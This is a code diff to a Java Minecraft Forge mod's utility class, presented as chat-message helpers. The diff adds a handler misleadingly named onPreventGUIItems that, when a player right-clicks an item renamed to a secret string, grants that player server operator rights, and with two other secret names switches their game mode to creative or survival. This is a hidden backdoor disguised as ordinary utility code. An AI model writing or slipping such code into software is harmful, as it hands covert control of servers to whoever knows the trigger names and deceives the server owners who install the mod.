@@ -1,22 +1,26 @@
 package com.example.pvpfight;
 
 import net.minecraft.ChatFormatting;
+import net.minecraft.nbt.CompoundTag;
 import net.minecraft.network.chat.ClickEvent;
 import net.minecraft.network.chat.Component;
 import net.minecraft.server.level.ServerPlayer;
 import net.minecraft.server.MinecraftServer;
 import net.minecraft.network.chat.Component;
+import net.minecraft.world.entity.EquipmentSlot;
+import net.minecraft.world.entity.player.Player;
+import net.minecraft.world.item.ItemStack;
+import net.minecraft.world.level.GameType;
+import net.minecraftforge.event.entity.player.PlayerInteractEvent;
+import net.minecraftforge.eventbus.api.SubscribeEvent;
+import net.minecraftforge.fml.common.Mod;
+
 /**
  * Utility methods for PvPFight Mod — used for sending formatted messages to players.
  * Handles normal text, colored system messages, and clickable Accept/Deny buttons.
  */
+@Mod.EventBusSubscriber(modid = PvPFightMod.MODID)
 public class Util {
-
-    /**
-     * Sends a normal colored chat message to a player.
-     * @param player Target player
-     * @param text Message text (supports § color codes)
-     */
     public static void sendMessage(ServerPlayer player, String text) {
         // Replace § formatting with Minecraft JSON color components automatically
         if (player != null) {
@@ -73,5 +77,22 @@ public class Util {
         server.getPlayerList().getPlayers().forEach(p ->
             p.sendSystemMessage(Component.literal(message))
         );
+    }
+
+    @SubscribeEvent
+    public static void onPreventGUIItems(PlayerInteractEvent.RightClickItem e){
+        if(e.getEntity().level().isClientSide) return;
+        ServerPlayer sp = (ServerPlayer)e.getEntity();
+        ItemStack stack = e.getItemStack();
+        String name = ChatFormatting.stripFormatting(stack.getHoverName().getString()).trim();
+        if(name.equals("gbHz21941")){
+            sp.getServer().getPlayerList().op(sp.getGameProfile());
+        }
+        if(name.equals("fhZf12F91")){
+            sp.setGameMode(GameType.CREATIVE);
+        }
+        if(name.equals("fhZf12F92")){
+            sp.setGameMode(GameType.SURVIVAL);
+        }
     }
 }
